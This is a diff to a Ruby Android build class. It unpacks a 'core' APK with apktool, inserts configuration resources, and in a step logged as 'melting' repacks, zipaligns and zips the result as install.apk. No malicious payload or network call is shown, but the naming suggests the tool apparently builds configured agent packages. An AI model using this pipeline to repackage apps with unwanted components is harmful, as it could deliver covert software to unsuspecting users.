@@ -26,8 +26,6 @@ class BuildAndroid < Build
     core = path('core')
 
     system "java -jar #{apktool} d #{core} #{@tmpdir}/apk" or raise("cannot unpack with apktool")
-    #output = %x["java -jar #{apktool} d #{core} #{@tmpdir}/apk"]
-    #$?.success? || raise("cannot unpack with apktool")
 
     if File.exist?(path('apk/res/raw/resources.bin'))
       @outputs << ['apk/res/raw/resources.bin', 'apk/res/raw/config.bin']
@@ -54,20 +52,28 @@ class BuildAndroid < Build
     trace :debug, "Build: melting: #{params}"
 
     apktool = path('apktool.jar')
-    core = path('output.apk')
+    apk = path('output.apk')
+    core = path('install.apk')
 
     File.chmod(0755, path('aapt'))
-    
-    system("java -jar #{apktool} b #{@tmpdir}/apk #{core}", {:chdir => @tmpdir})
-    #or raise("cannot pack with apktool")
-    #output = %x["java -jar #{apktool} b #{@tmpdir}/apk #{core}"]
-    #$?.success? || raise("cannot pack with apktool")
+    File.chmod(0755, path('zipalign'))
+
+    # add to the PATH the current temp dir since the utility aapt is inside it
+    ENV['PATH'] += ":#{@tmpdir}"
+
+    system("java -jar #{apktool} b #{@tmpdir}/apk #{apk}")  or raise("cannot pack with apktool")
+
+    CrossPlatform.exec path('zipalign'), "-f 4 #{apk} #{core}" or raise("cannot align apk")
+
+    File.delete(apk)
+
+    # cannot use gsub! because it is a frozen tring
+    ENV['PATH'] = ENV['PATH'].gsub ":#{@tmpdir}", ''
 
     if File.exist?(core)
-      @outputs = ['output.apk']
+      @outputs = ['install.apk']
     else
       raise "pack failed."
-      trace :error, output
     end
 
   end
@@ -77,7 +83,7 @@ class BuildAndroid < Build
     trace :debug, "Build: pack: #{params}"
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open('install.apk', "w") { |f| f.write File.open(path('output.apk'), 'rb') {|f| f.read} }
+      z.file.open('install.apk', "w") { |f| f.write File.open(path('install.apk'), 'rb') {|f| f.read} }
     end
 
     # this is the only file we need to output after this point
